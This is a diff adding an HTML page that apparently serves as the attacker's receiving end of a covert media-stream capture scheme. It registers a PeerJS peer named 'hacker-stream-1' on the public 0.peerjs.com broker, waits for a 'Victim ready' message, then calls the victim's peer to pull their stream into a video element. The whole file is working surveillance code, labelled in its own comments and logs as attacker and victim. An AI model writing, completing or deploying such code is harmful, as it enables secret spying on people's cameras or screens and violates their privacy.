@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head><title>Receiver</title></head>
+<body>
+  <h1>Incoming Streams</h1>
+  <video id="remote" autoplay playsinline controls style="width:100%; max-width:600px;"></video>
+  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
+  <script>
+    const ATTACKER_ID = "hacker-stream-1";
+    const peer = new Peer(ATTACKER_ID, {
+      host: '0.peerjs.com', port: 443, secure: true, key: 'peerjs'
+    });
+    
+    peer.on('open', (id) => {
+      console.log("Attacker peer ID:", id);
+    });
+    
+    peer.on('connection', (conn) => {
+      conn.on('data', (data) => {
+        if (data.type === 'stream_ready') {
+          console.log("Victim ready:", data.peerId);
+          // Call the victim's peer ID to receive their stream
+          const call = peer.call(data.peerId, new MediaStream());
+          call.on('stream', (remoteStream) => {
+            document.getElementById('remote').srcObject = remoteStream;
+          });
+        }
+      });
+    });
+  </script>
+</body>
+</html>
